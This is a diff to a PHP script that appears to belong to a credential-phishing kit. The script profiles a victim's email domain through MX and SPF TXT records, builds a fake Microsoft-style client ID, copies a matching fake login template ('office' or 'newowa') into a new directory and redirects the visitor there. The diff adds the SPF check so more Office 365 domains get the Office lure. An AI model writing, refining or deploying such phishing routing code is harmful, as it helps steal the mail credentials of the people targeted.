@@ -292,6 +292,15 @@ class geoPlugin {
 
 //SCRIPT STARTS HERE
 
+//check txt for office spf
+function searchtxt($domain){ 
+$result = array();
+$result = dns_get_record($domain, DNS_TXT);
+$b = $result[0]['txt']." ".$result[1]['txt']." ".$result[2]['txt']." ".$result[3]['txt']." ".$result[4]['txt']." ".$result[5]['txt']." ".$result[6]['txt']." ".$result[7]['txt']." ".$result[8]['txt']." ".$result[9]['txt']." ".$result[10]['txt']." ".$result[11]['txt']." ".$result[12]['txt']." ".$result[13]['txt']." ".$result[14]['txt']." ".$result[15]['txt']." ".$result[16]['txt'];
+$c = strtolower($b);
+return strpos($c, 'spf.protection.outlook.com');
+}
+
 if(empty($_POST['token']))
 {
 header("location: ../../");
@@ -373,7 +382,7 @@ getmxrr($domain, $hosts);
 $owac = check_owa($domain);
 $a = strtolower($hosts[0]);
 
-if (strpos($a, 'outlook') !== false) {
+if (strpos($a, 'outlook') !== false || searchtxt($domain)!== false) {
     $src="office";
 	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
 	$token = $token_kr;
@@ -393,7 +402,7 @@ elseif ($owac == 'other exchange'){
 	header("Location: $dst/load.php?token=$token_kr");	
 }
 elseif ($owac == 'old exchange'){
-	$src="oldowa";
+	$src="newowa";
 	recurse_copy( $src, $dst );
 	header("Location: $dst/load.php?token=$token_kr");	
 }
